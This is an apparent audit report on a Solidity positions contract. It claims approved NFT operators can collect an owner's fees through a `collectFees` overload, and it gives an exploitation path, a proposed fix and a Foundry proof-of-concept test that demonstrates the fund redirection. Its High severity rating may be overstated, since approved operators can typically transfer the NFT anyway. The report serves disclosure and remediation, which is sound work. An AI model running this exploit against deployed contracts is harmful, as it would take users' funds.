## Title
Approved NFT Operators Can Steal Position Fees via collectFees Function

## Summary
The `BasePositions.collectFees` function (lines 100-107) sends accumulated swap fees to `msg.sender` rather than to the NFT owner. When an approved operator calls this function, fees are redirected to the operator instead of the rightful owner, enabling direct theft of user funds. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description

**Location:** `src/base/BasePositions.sol`, function `collectFees` (lines 100-107)

**Intended Logic:** The `collectFees` function is documented as "Collects accumulated fees from a position to msg.sender" in the interface. The intended behavior appears to be that the position owner calls this function to collect their own fees conveniently. [2](#0-1) 

**Actual Logic:** The function uses the `authorizedForNft(id)` modifier, which allows both the NFT owner AND any approved operator to pass authorization. When an approved operator calls the function, fees are sent to the operator (msg.sender) rather than the owner. [3](#0-2) 

The authorization check uses Solady's ERC721 `_isApprovedOrOwner` function, which returns true for owners, single-token approved addresses, and operator-approved addresses.

**Exploitation Path:**
1. **Owner grants approval**: Position owner (Alice) approves an operator address (Bob) via `approve(bob, tokenId)` or `setApprovalForAll(bob, true)`. This commonly occurs when using third-party services for position management, rebalancing, or automated strategies.

2. **Operator collects fees to themselves**: Bob calls `positions.collectFees(tokenId, poolKey, tickLower, tickUpper)` with his own address as msg.sender.

3. **Fees redirected**: Line 106 passes `msg.sender` (Bob's address) as the recipient parameter to the overloaded `collectFees` function, which eventually sends tokens to Bob via the withdraw mechanism. [4](#0-3) 

4. **Funds stolen**: Bob receives all accumulated fees that rightfully belong to Alice. Alice retains the NFT but loses her fees, making the theft less immediately obvious than an NFT transfer.

**Security Property Broken:** This violates the **Fee Accounting** invariant: "Position fee collection must be accurate and never allow double-claiming." While technically not "double-claiming," it enables unauthorized claiming where fees are stolen by an approved party rather than collected by the rightful owner.

## Impact Explanation

- **Affected Assets**: All accumulated swap fees (token0 and token1) for any liquidity position where the owner has granted NFT approval to another address.

- **Damage Severity**: Complete loss of accumulated fees for affected positions. Given that concentrated liquidity positions can accumulate substantial fees (especially in high-volume pools), the loss per victim can be significant. An attacker can drain fees from multiple positions if approved for multiple NFTs.

- **User Impact**: Any liquidity provider who grants NFT approval for legitimate purposes (automated rebalancing services, vault contracts, aggregator protocols, smart contract wallets) becomes vulnerable. The attack is silent - the NFT remains in the owner's wallet, but economic value is extracted.

## Likelihood Explanation

- **Attacker Profile**: Any address that receives NFT approval - could be a malicious third-party service, a compromised smart contract, or an attacker who tricks users into granting approval.

- **Preconditions**: 
  - Position must have accumulated fees (occurs naturally through swap activity)
  - Owner must have granted approval via `approve()` or `setApprovalForAll()`
  - No additional preconditions - works on any position, any pool, any fee amount

- **Execution Complexity**: Single transaction. Attacker simply calls `collectFees` with the position parameters. No timing requirements, no complex state manipulation.

- **Frequency**: Can be executed once per position per fee accumulation cycle. Attacker can monitor positions they're approved for and extract fees continuously as they accumulate.

## Recommendation

Modify the convenience overload to always send fees to the NFT owner, not to msg.sender:

```solidity
// In src/base/BasePositions.sol, function collectFees, lines 100-107:

// CURRENT (vulnerable):
function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper)
    public
    payable
    authorizedForNft(id)
    returns (uint128 amount0, uint128 amount1)
{
    (amount0, amount1) = collectFees(id, poolKey, tickLower, tickUpper, msg.sender);
}

// FIXED:
function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper)
    public
    payable
    authorizedForNft(id)
    returns (uint128 amount0, uint128 amount1)
{
    // Always send fees to the position owner, not the caller
    (amount0, amount1) = collectFees(id, poolKey, tickLower, tickUpper, ownerOf(id));
}
```

**Note:** The same fix should be applied to the `withdraw` convenience overload at line 141, which has an identical vulnerability allowing operators to withdraw liquidity to themselves. [5](#0-4) 

Alternative mitigation: Remove the convenience overloads entirely and require callers to always specify the recipient explicitly, forcing users to make conscious decisions about where funds are sent.

## Proof of Concept

```solidity
// File: test/Exploit_ApprovedOperatorFeeTheft.t.sol
// Run with: forge test --match-test test_ApprovedOperatorStealsAccumulatedFees -vvv

pragma solidity ^0.8.31;

import {FullTest} from "./FullTest.sol";
import {CallPoints} from "../src/types/callPoints.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {RouteNode, TokenAmount} from "../src/Router.sol";
import {SqrtRatio} from "../src/types/sqrtRatio.sol";

contract Exploit_ApprovedOperatorFeeTheft is FullTest {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    
    function test_ApprovedOperatorStealsAccumulatedFees() public {
        // SETUP: Create pool and position
        PoolKey memory poolKey = createPool(0, 1 << 63, 100, CallPoints(false,false,false,false,false,false,false,false));
        
        // Alice creates a position and provides liquidity
        token0.mint(alice, 1000);
        token1.mint(alice, 1000);
        
        vm.startPrank(alice);
        token0.approve(address(positions), 1000);
        token1.approve(address(positions), 1000);
        (uint256 id, uint128 liquidity,,) = positions.mintAndDeposit(poolKey, -100, 100, 100, 100, 0);
        vm.stopPrank();
        
        // Generate fees through swaps
        token0.mint(address(this), 200);
        token0.approve(address(router), 200);
        router.swap(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token0), amount: 100}),
            type(int256).min
        );
        
        // Verify fees have accumulated
        (,,,uint128 fees0Before, uint128 fees1Before) = positions.getPositionFeesAndLiquidity(id, poolKey, -100, 100);
        assertGt(fees0Before, 0, "Fees should have accumulated");
        
        // Alice approves Bob (e.g., for a rebalancing service)
        vm.prank(alice);
        positions.approve(bob, id);
        
        // Record balances before attack
        uint256 aliceToken0Before = token0.balanceOf(alice);
        uint256 bobToken0Before = token0.balanceOf(bob);
        
        // EXPLOIT: Bob steals accumulated fees
        vm.prank(bob);
        (uint128 stolenAmount0, uint128 stolenAmount1) = positions.collectFees(id, poolKey, -100, 100);
        
        // VERIFY: Fees went to Bob instead of Alice
        assertEq(token0.balanceOf(alice), aliceToken0Before, "Alice's balance should not change");
        assertEq(token0.balanceOf(bob), bobToken0Before + stolenAmount0, "Bob stole the fees");
        assertGt(stolenAmount0, 0, "Bob received stolen fees");
        
        // Verify position still belongs to Alice but has no fees
        assertEq(positions.ownerOf(id), alice, "Alice still owns the NFT");
        (,,,uint128 fees0After,) = positions.getPositionFeesAndLiquidity(id, poolKey, -100, 100);
        assertEq(fees0After, 0, "All fees were stolen");
    }
}
```

**Notes:**

This vulnerability represents a fundamental design flaw in the authorization model for fee collection. While ERC721 approval is powerful and can enable token transfers, liquidity positions introduce a new attack surface where the economic value (fees and liquidity) can be extracted without transferring the NFT itself. This makes the theft less obvious and violates user expectations that approvals enable "acting on behalf of" the owner, not "stealing from" the owner.

The vulnerability affects the entire Positions contract ecosystem since `BasePositions` is inherited by the deployed `Positions` contract. Any integrated protocols, vaults, or aggregators that encourage users to grant approvals for position management become attack vectors for this vulnerability.

### Citations

**File:** src/base/BasePositions.sol (L100-107)
```text
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper)
        public
        payable
        authorizedForNft(id)
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = collectFees(id, poolKey, tickLower, tickUpper, msg.sender);
    }
```

**File:** src/base/BasePositions.sol (L110-117)
```text
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
    }
```

**File:** src/base/BasePositions.sol (L136-142)
```text
    function withdraw(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, uint128 liquidity)
        public
        payable
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, liquidity, address(msg.sender), true);
    }
```

**File:** src/interfaces/IPositions.sol (L59-69)
```text
    /// @notice Collects accumulated fees from a position to msg.sender
    /// @param id The NFT token ID representing the position
    /// @param poolKey Pool key identifying the pool
    /// @param tickLower Lower tick of the price range of the position
    /// @param tickUpper Upper tick of the price range of the position
    /// @return amount0 Amount of token0 fees collected
    /// @return amount1 Amount of token1 fees collected
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper)
        external
        payable
        returns (uint128 amount0, uint128 amount1);
```

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```
